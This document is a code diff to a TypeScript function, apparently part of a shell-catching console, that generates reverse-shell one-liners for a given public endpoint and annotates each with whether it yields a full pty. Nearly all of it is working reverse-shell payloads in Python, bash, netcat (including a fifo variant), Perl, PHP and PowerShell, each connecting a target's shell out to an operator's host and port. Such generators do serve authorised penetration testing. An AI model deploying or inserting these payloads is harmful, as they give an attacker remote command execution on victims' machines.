@@ -8,6 +8,10 @@
 export interface CatchLauncher {
   id: string
   os: string
+  // What the shape gives on the wire: whether the caught shell runs under a
+  // pty (echoes typing, ^C interrupts, colors, full-screen programs) or is a
+  // dumb pipe (works, but typing is invisible and ^C is just a byte).
+  note: string
   command: string
 }
 
@@ -23,13 +27,15 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     // The python pty shape leads: it is the full-interactive catch -- a real
     // pty is what echoes typing, colors the prompt, turns ^C into SIGINT,
     // and runs full-screen programs. python3 is the dependency most targets
-    // actually have (socat and script are rarer); the socat shape serves the
-    // targets that have it instead, and the plain shapes are the last
-    // resort -- they work, but the shell has no terminal, so typing has no
-    // echo and ^C is just a byte.
+    // actually have (socat is rarer); the socat shape serves the targets
+    // that have it instead, and the plain shapes are the last resort -- they
+    // work, but the shell has no terminal, so typing has no echo and ^C is
+    // just a byte. The console's Local echo switch makes the plain shapes'
+    // typing visible; nothing but a pty makes ^C interrupt.
     {
       id: 'unix-python-pty',
       os: 'linux',
+      note: 'full interactive — real pty',
       command:
         `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(["/bin/sh","-c","stty rows 30 cols 120; export TERM=xterm-256color; exec bash -i"])'`,
     },
@@ -37,6 +43,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     {
       id: 'unix-socat',
       os: 'linux',
+      note: 'full interactive — real pty',
       // The same pty posture over socat, for targets that have it: the exec
       // preamble sizes the pty and names its terminal type before
       // the shell runs: a pty at the default 0x0 refuses full-screen
@@ -51,6 +58,7 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     {
       id: 'unix-bash',
       os: 'linux',
+      note: 'dumb — no echo, no ^C; flip Local echo in the console',
       // No pty here -- the plain bash-over-socket shape. The TERM default
       // keeps the target's rc files on their colored-prompt branch when the
       // paste context carries no TERM (a web shell, a bare exec): without it
@@ -62,22 +70,47 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     // The -e flag belongs to traditional/GNU netcat; the OpenBSD build
     // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
     // it. Showing both costs nothing while a missing one costs a round trip.
-    { id: 'unix-nc', os: 'linux', command: `nc -e /bin/sh ${host} ${port}` },
+    {
+      id: 'unix-nc',
+      os: 'linux',
+      note: 'dumb — no echo, no ^C; flip Local echo in the console',
+      command: `nc -e /bin/sh ${host} ${port}`,
+    },
     {
       id: 'unix-nc-fifo',
       os: 'linux',
+      note: 'dumb — for OpenBSD netcat; flip Local echo in the console',
       command: `rm -f ${fifo}; mkfifo ${fifo}; cat ${fifo} | /bin/sh -i 2>&1 | nc ${host} ${port} > ${fifo}`,
     },
 
-    { id: 'unix-python', os: 'linux', command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+    {
+      id: 'unix-python',
+      os: 'linux',
+      note: 'dumb — no echo, no ^C; flip Local echo in the console',
+      command:
+        `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+    },
 
-    { id: 'unix-perl', os: 'linux', command: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
+    {
+      id: 'unix-perl',
+      os: 'linux',
+      note: 'dumb — no echo, no ^C; flip Local echo in the console',
+      command:
+        `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+    },
 
-    { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
+    {
+      id: 'unix-php',
+      os: 'linux',
+      note: 'dumb — no echo, no ^C; flip Local echo in the console',
+      command:
+        `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+    },
 
     {
       id: 'windows-powershell',
       os: 'windows',
+      note: 'dumb — prints its own prompt; no ^C',
       command:
         `powershell -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});` +
         `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
